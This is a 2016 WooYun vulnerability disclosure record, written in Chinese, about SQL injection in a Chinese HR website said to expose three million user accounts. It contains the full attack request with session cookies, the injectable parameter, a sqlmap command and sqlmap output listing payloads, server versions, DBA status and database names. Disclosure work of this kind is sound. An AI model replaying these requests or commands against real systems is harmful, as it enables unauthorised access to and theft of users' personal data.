{"id": 87122, "wybug_id": "wooyun-2016-0194563", "wybug_title": "中国人力资源网SQL注入涉及三百万用户数据(dba)", "wybug_corp": "中国人力资源网", "wybug_author": "路人甲", "wybug_date": "2016-04-11 12:45", "wybug_open_date": "2016-05-26 12:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-05-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  post.txt:\nPOST /home/ajax HTTP/1.1Content-Length: 245Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.hr.com.cn/Cookie: YII_CSRF_TOKEN=0cc83a083960abe3c5c935341ae1ccb3efa4127f; PHPSESSID=nbp8o8718gju3o9n698cq7fo64; postview=1423415234%2C1423415225%2C1423415228%2C1423415178%2C1423415229%2C1423414048%2C1423414005%2C1423415230%2C1423415222%2C1423415187%2C1423415216%2C1423415179%2C1423415182%2C1423415198%2C1423415173%2C1423415163%2C1423415186%2C1423415190%2C1423415226%2C1423415164%2C1423415020%2C1423415233%2C1423415196%2C1423406123%2C1423415231%2C1423415180%2C1423415218%2C1423415212%2C1423415223%2C1423395125%2C1423415220%2C1423415201%2C1423415131%2C1423406121%2C1423415215%2C1423415119%2C1423415133%2C1423415098%2C1423406084%2C1423401529%2C1423415232%2C1423415171%2C1423414977%2C1423399179%2C1423414983%2C1423415114%2C1423406106%2C1423414573%2C1423414921%2C1423414808%2C1423414160%2C1423412421%2C1423412416%2C1423414746%2C1423412408%2C1423414765%2C1423415104%2C1423412452%2C1423400309%2C1423415184%2C1423415209%2C1423412255%2C1423415082%2C1423415195%2C1423414970%2C1423415120%2C1423414622%2C1423414937%2C1423414694%2C1423415028%2C1423415019%2C1423415162%2C1423413820Host: www.hr.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*action=getMoreArticles&countH=5&countR=0&dateline=1459825432&type=&value=&YII_CSRF_TOKEN=0cc83a083960abe3c5c935341ae1ccb3efa4127f\n注入参数dateline\npython sqlmap.py -r hr.txt --current-db --is-dba -p dateline --random-agent --dbs\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: dateline (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: action=getMoreArticles&countH=5&countR=0&dateline=1459825432) AND 5066=5066 AND    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: action=getMoreArticles&countH=5&countR=0&dateline=1459825432) AND (SELECT 5703 F---[10:36:27] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: Apache 2.2.15, PHP 5.2.17back-end DBMS: MySQL 5.0[10:36:27] [INFO] fetching current database[10:36:27] [INFO] resumed: hr_newcurrent database:    'hr_new'[10:36:27] [INFO] testing if current user is DBA[10:36:27] [INFO] fetching current user[10:36:27] [INFO] resumed: root@127.0.0.1current user is DBA:    True[10:36:27] [INFO] fetching database names[10:36:29] [INFO] the SQL query used returns 11 entries[10:36:29] [INFO] retrieved: information_schema[10:36:29] [INFO] retrieved: club_bbs[10:36:29] [INFO] retrieved: clubx[10:36:29] [INFO] retrieved: hr[10:36:29] [INFO] retrieved: hr_new[10:36:30] [INFO] retrieved: #mysql50#lost+found[10:36:30] [INFO] retrieved: mysql[10:36:30] [INFO] retrieved: tar_dir[10:36:30] [INFO] retrieved: test[10:36:30] [INFO] retrieved: tmp[10:36:30] [INFO] retrieved: tmp_diravailable databases [11]:[*] #mysql50#lost+found[*] club_bbs[*] clubx[*] hr[*] hr_new[*] information_schema[*] mysql[*] tar_dir[*] test[*] tmp[*] tmp_dir\n   漏洞证明：  数据库信息，当前dba权限：\n\n涉及300万用户数据数据240万：\n\n120万：\n\n涉及账号密码：\n\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}